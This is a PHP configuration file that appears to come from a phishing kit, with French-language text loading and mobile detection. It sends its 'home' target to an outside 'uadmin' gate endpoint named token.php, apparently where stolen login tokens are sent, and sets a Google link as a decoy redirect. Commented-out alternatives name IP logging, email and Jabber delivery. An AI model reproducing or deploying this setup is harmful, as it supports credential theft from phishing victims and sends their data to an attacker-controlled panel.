<?php
$php_js=new stdClass();
require('inc/Mobile_Detect.php'); 
require('php.php');
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 

$php_js->texts=file_exists(__dir__."/texts.json") && filesize(__dir__."/texts.json") >10? @file_get_contents(__dir__."/texts.json"):"{}";
$php_js->lng="fr";
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
// 
$php_js->file="somefilelink";
$php_js->query=$_SERVER['QUERY_STRING'];
$php_js->link="uni.it";
$php_js->bb_link="https://google.com/";




// 
// 
// 
// 
// 
// 
// 
// 
// $php_js->home=$relative_root."iplogs/file.php";
// $php_js->home=$relative_root."email.php";
// $php_js->home=$relative_root."jabb.php";
$php_js->home="https://uadminpanel.me/uadmin/gates/token.php";
// 
// 
// 
// 
// 
// 
// 
// 
// ses($php_js->bb_link,'login');
?>
